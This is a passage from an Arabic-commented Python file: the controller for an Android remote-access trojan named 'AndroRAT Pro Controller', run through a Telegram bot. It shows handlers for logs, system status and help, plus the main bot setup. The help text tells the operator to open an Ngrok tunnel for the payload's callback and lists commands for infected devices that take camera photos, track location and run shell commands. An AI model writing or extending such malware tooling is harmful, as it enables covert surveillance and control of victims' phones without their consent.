📁 <b>مجلد البيانات:</b> <code>{Config.BASE_DIR}</code>
🔐 <b>التشفير:</b> <code>{"مفعل" if CRYPTO_AVAILABLE else "معطل"}</code>
"""
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_main_keyboard()
        )

async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض السجلات"""
    if not is_authorized(update.effective_user.id):
        return
    
    logs = command_logger.get_logs(limit=10)
    
    if not logs:
        await update.message.reply_text("📭 لا توجد سجلات")
        return
    
    text = "📜 <b>آخر 10 أوامر:</b>\n\n"
    for log in logs:
        emoji = "✅" if log.status == "success" else "❌"
        text += f"{emoji} <b>{log.command}</b> | {log.device_id[:8]}\n"
        text += f"⏰ {log.timestamp[11:19]} | ⏱️ {log.duration:.2f}s\n\n"
    
    await update.message.reply_html(text)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """حالة النظام"""
    if not is_authorized(update.effective_user.id):
        return
    
    # معلومات النظام
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    text = f"""
🖥️ <b>حالة النظام</b>
═══════════════════

💻 <b>المعالج:</b> <code>{cpu_percent}%</code>
💾 <b>الذاكرة:</b> <code>{memory.percent}%</code> ({memory.used//1024//1024}MB/{memory.total//1024//1024}MB)
💿 <b>القرص:</b> <code>{disk.percent}%</code> مستخدم

🌐 <b>الاتصال:</b>
• Ngrok: <code>{"متصل" if ngrok_manager.get_status()['running'] else "غير متصل"}</code>
• السيرفر: <code>{"متصل" if http_client.get(Config.CONTROL_SERVER_URL)[0] else "غير متصل"}</code>

⏰ <b>الوقت:</b> <code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
"""
    await update.message.reply_html(text)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """المساعدة"""
    if not is_authorized(update.effective_user.id):
        return
    
    text = """
📖 <b>دليل الاستخدام</b>
═══════════════════

🌐 <b>Ngrok:</b>
1. اضغط على "إدارة Ngrok"
2. اضغط "تشغيل النفق"
3. انتظر ظهور الرابط
4. انسخ الرابط لاستخدامه في Payload

📱 <b>إضافة جهاز:</b>
1. انتقل إلى "إدارة الأجهزة"
2. اضغط على الجهاز للتحكم
3. اختر الأمر المطلوب

🛠️ <b>إنشاء Payload:</b>
1. تأكد من تشغيل Ngrok
2. انسخ الرابط العام
3. استخدم الرابط في إعدادات البايلود

⚡ <b>أوامر سريعة:</b>
/cam - التقاط صورة
/location - تحديد الموقع
/shell - تنفيذ أمر

💡 <b>نصائح:</b>
• استخدم Ngrok للوصول من أي مكان
• راقب استهلاك الموارد في /status
• تحقق من السجلات في /logs
"""
    await update.message.reply_html(text)

# ═══════════════════════════════════════════════════════════════
# التشغيل الرئيسي
# ═══════════════════════════════════════════════════════════════

def main():
    """الدالة الرئيسية"""
    
    # التحقق من الإعدادات
    if not Config.BOT_TOKEN:
        logger.error("❌ لم يتم تعيين TELEGRAM_BOT_TOKEN")
        print("❌ يرجى تعيين متغير البيئة TELEGRAM_BOT_TOKEN")
        return
    
    if not Config.AUTHORIZED_USERS:
        logger.warning("⚠️ لم يتم تعيين مستخدمين مصرح لهم")
    
    # إنشاء التطبيق
    application = Application.builder().token(Config.BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ngrok", ngrok_command))
    application.add_handler(CommandHandler("devices", devices_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # معالج الأخطاء
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
        logger.error(f"حدث خطأ: {context.error}", exc_info=context.error)
        if update and hasattr(update, 'effective_message'):
            await update.effective_message.reply_text(
                "❌ حدث خطأ غير متوقع. تحقق من السجلات."
            )
    
    application.add_error_handler(error_handler)
    
    logger.info("🚀 بدء تشغيل AndroRAT Pro Controller...")
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║         🤖 AndroRAT Pro Controller v2.0                  ║
    ║══════════════════════════════════════════════════════════║
    ║  🌐 Ngrok: مدعوم بالكامل                                  ║
    ║  📱 أجهزة: متقدم                                          ║
    ║  🔐 تشفير: {"مفعل" if CRYPTO_AVAILABLE else "معطل"}                    ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()


print("✅ تم إنشاء الكود المتقدم بنجاح!")
print(f"📊 حجم الكود: {len(advanced_bot_code)} حرف")
